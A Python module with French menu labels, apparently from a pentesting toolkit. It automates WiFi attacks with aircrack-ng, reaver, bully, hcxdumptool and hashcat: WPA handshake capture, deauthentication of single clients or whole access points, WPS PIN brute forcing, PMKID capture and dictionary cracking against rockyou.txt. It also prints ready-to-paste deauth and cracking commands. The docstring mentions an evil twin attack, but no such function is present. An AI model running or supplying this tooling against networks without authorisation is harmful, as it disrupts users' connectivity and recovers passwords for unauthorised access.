"""WiFi : 12 actions — monitor, scan, capture, crack, evil twin."""

import os
import time
import subprocess
from core import ui, runner


def _list_ifaces():
    try:
        out = subprocess.check_output(["iw", "dev"], text=True)
        return [line.split()[1] for line in out.splitlines() if "Interface" in line]
    except Exception:
        return []


def _pick_iface():
    ifaces = _list_ifaces()
    if not ifaces:
        ui.err("aucune interface WiFi détectée (iw dev)")
        return None
    ui.info("interfaces : " + ", ".join(ifaces))
    return ui.ask("interface", default=ifaces[0])


def monitor_start():
    ui.header("Activer mode monitor")
    if not runner.check_tools(["airmon-ng"]): ui.pause(); return
    iface = _pick_iface()
    if not iface: ui.pause(); return
    runner.run(["airmon-ng", "check", "kill"], tag="airmon-kill", root=True)
    runner.run(["airmon-ng", "start", iface], tag="airmon-start", root=True)
    ui.ok("vérifie l'interface (généralement wlan0mon)")
    ui.pause()


def monitor_stop():
    ui.header("Désactiver mode monitor")
    iface = _pick_iface()
    if not iface: ui.pause(); return
    runner.run(["airmon-ng", "stop", iface], tag="airmon-stop", root=True)
    runner.run(["systemctl", "restart", "NetworkManager"], tag="nm-restart", root=True)
    ui.pause()


def scan_networks():
    ui.header("Scan WiFi (airodump-ng) — Ctrl-C pour stop")
    iface = _pick_iface()
    if not iface: ui.pause(); return
    runner.run(["airodump-ng", iface], tag="airodump-scan", root=True)
    ui.pause()


def scan_targeted():
    ui.header("Scan ciblé (BSSID + channel) — capture vers fichier")
    iface = _pick_iface()
    bssid = ui.ask("BSSID cible (AA:BB:..)")
    chan  = ui.ask("channel")
    out   = ui.ask("préfixe fichier", default="capture")
    if not (iface and bssid and chan): ui.pause(); return
    runner.run(
        ["airodump-ng", "-c", chan, "--bssid", bssid, "-w", out, iface],
        tag="airodump-target", root=True
    )
    ui.pause()


def capture_handshake():
    ui.header("Capture handshake WPA — lance scan ciblé puis deauth dans 2e terminal")
    iface = _pick_iface()
    bssid = ui.ask("BSSID")
    chan  = ui.ask("channel")
    out   = ui.ask("préfixe fichier", default="hs")
    if not (iface and bssid and chan): ui.pause(); return
    ui.warn("Garde airodump ouvert. Dans un AUTRE terminal lance : ")
    ui.info(f"  sudo aireplay-ng -0 5 -a {bssid} {iface}")
    ui.info("Quand 'WPA handshake' apparaît en haut → handshake capturé\n")
    runner.run(
        ["airodump-ng", "-c", chan, "--bssid", bssid, "-w", out, iface],
        tag="airodump-hs", root=True
    )
    ui.pause()


def deauth_client():
    ui.header("Deauth — un client précis")
    iface  = _pick_iface()
    bssid  = ui.ask("BSSID AP")
    client = ui.ask("MAC client")
    count  = ui.ask("nb paquets (0 = infini)", default="10")
    if not (iface and bssid and client): ui.pause(); return
    runner.run(
        ["aireplay-ng", "-0", count, "-a", bssid, "-c", client, iface],
        tag="deauth-one", root=True
    )
    ui.pause()


def deauth_all():
    ui.header("Deauth broadcast — tous clients de l'AP")
    iface  = _pick_iface()
    bssid  = ui.ask("BSSID AP")
    count  = ui.ask("nb paquets", default="20")
    if not (iface and bssid): ui.pause(); return
    if not ui.confirm(f"Confirmer deauth broadcast sur {bssid} ?"): return
    runner.run(["aireplay-ng", "-0", count, "-a", bssid, iface], tag="deauth-all", root=True)
    ui.pause()


def wps_pixie():
    ui.header("WPS pixie dust (reaver)")
    if not runner.check_tools(["reaver"]): ui.pause(); return
    iface = _pick_iface()
    bssid = ui.ask("BSSID")
    chan  = ui.ask("channel")
    if not (iface and bssid and chan): ui.pause(); return
    runner.run(
        ["reaver", "-i", iface, "-b", bssid, "-c", chan, "-K", "1", "-vv"],
        tag="wps-pixie", root=True
    )
    ui.pause()


def wps_bully():
    ui.header("WPS bruteforce (bully)")
    if not runner.check_tools(["bully"]): ui.pause(); return
    iface = _pick_iface()
    bssid = ui.ask("BSSID")
    chan  = ui.ask("channel")
    if not (iface and bssid and chan): ui.pause(); return
    runner.run(["bully", "-b", bssid, "-c", chan, iface], tag="wps-bully", root=True)
    ui.pause()


def pmkid_capture():
    ui.header("PMKID — hcxdumptool (capture sans client)")
    if not runner.check_tools(["hcxdumptool"]): ui.pause(); return
    iface = _pick_iface()
    out   = ui.ask("fichier de sortie", default="pmkid.pcapng")
    if not iface: ui.pause(); return
    runner.run(
        ["hcxdumptool", "-i", iface, "-w", out, "--enable_status=1"],
        tag="hcxdump", root=True
    )
    ui.ok(f"convertir en hash : hcxpcapngtool -o pmkid.hc22000 {out}")
    ui.ok("crack : hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt")
    ui.pause()


def crack_handshake():
    ui.header("Crack handshake (aircrack-ng + dictionnaire)")
    if not runner.check_tools(["aircrack-ng"]): ui.pause(); return
    cap = ui.ask(".cap/.pcap")
    wl  = ui.ask("wordlist", default="/usr/share/wordlists/rockyou.txt")
    if not cap: ui.pause(); return
    if not os.path.exists(wl):
        ui.warn(f"wordlist absente — décompresse : gunzip {wl}.gz")
        ui.pause(); return
    runner.run(["aircrack-ng", "-w", wl, cap], tag="aircrack")
    ui.pause()


def crack_pmkid():
    ui.header("Crack PMKID (hashcat mode 22000)")
    if not runner.check_tools(["hashcat"]): ui.pause(); return
    hf = ui.ask("fichier .hc22000")
    wl = ui.ask("wordlist", default="/usr/share/wordlists/rockyou.txt")
    if not hf: ui.pause(); return
    runner.run(["hashcat", "-m", "22000", hf, wl], tag="hashcat-pmkid")
    ui.pause()


ITEMS = [
    ("Activer mode monitor",          monitor_start),
    ("Désactiver mode monitor",       monitor_stop),
    ("Scan réseaux WiFi",             scan_networks),
    ("Scan ciblé + capture",          scan_targeted),
    ("Capturer handshake WPA",        capture_handshake),
    ("Deauth — un client",            deauth_client),
    ("Deauth — broadcast (tous)",     deauth_all),
    ("WPS pixie dust (reaver)",       wps_pixie),
    ("WPS bruteforce (bully)",        wps_bully),
    ("PMKID capture (hcxdumptool)",   pmkid_capture),
    ("Crack handshake (aircrack)",    crack_handshake),
    ("Crack PMKID (hashcat 22000)",   crack_pmkid),
]


def menu():
    while True:
        idx = ui.menu("WIFI", ITEMS)
        if idx is None: return
        ITEMS[idx][1]()
